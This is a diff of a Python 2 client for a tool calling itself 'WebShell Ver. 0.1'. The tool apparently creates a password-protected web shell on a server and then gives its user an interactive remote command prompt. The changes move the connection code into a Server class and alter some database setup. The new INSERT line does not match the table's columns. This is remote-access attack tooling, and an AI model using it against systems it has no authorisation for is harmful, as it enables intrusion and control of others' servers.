@@ -7,19 +7,12 @@ import json
 import argparse
 import sqlite3 as lite
 from core.terminal import Terminal
-
-con = None
+from core.server import Server
 
 try:
     con = lite.connect('db/database.db')
-    
-    cur = con.cursor()    
-    cur.execute('SELECT SQLITE_VERSION()')
-    
-    data = cur.fetchone()
-    
-    cur.execute("CREATE TABLE Shell(Id INT, Name TEXT, Price INT)")
-    
+    cur = con.cursor()                  
+    cur.execute("INSERT INTO Shell VALUES(1,'xxx','xxx','xxx')")
 except lite.Error, e:
     
     print "Error %s:" % e.args[0]
@@ -36,6 +29,7 @@ for line in open("extras/banner.txt"):
 	print line,
 print "\n"   
 print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
+print "     	  [*]------------------- Fork me on github -------------------[*]\n"
 print "\n"
 if args.u and args.p:
 	url = args.u
@@ -61,31 +55,15 @@ if args.g and args.p:
 			print('Something went wrong!')
 			sys.exit(1)
 	print('Shell was created!')
-	sys.exit(1)
-
-def conect():
-	targer = urllib.urlopen(url+"?pass="+args.p)
-	if targer.getcode() == 200:
-		htmlSource = targer.read()
-		j = json.loads(htmlSource)
-		return j
-	else:
-		print "robot@shuffle[~]$ Server Not Respond."
-		sys.exit(2)
-	
-def server_info():
-	targer = urllib.urlopen(url+"?pass="+args.p)
-	if targer.getcode() == 200:
-		htmlSource = targer.read()
-		j = json.loads(htmlSource)
-		return j['server_info']		
+	sys.exit(1)	
 			
 if args.u and args.p:			
-	con = conect()
+	Server = Server(args.u,args.p)
+	con = Server.conect()
 	if con['response'] == '200':
 		print "#> Conecction Established, Enjoy!\n"
 		terminal = Terminal(url,args.p)
-		server_info = server_info()
+		server_info = Server.server_info()
 		while True:
 			send = raw_input(server_info['server_name']+"@"+server_info['user']+"["+server_info['pwd']+"]"+server_info['user_bash']+">")
 			termina = terminal.terminal(send)
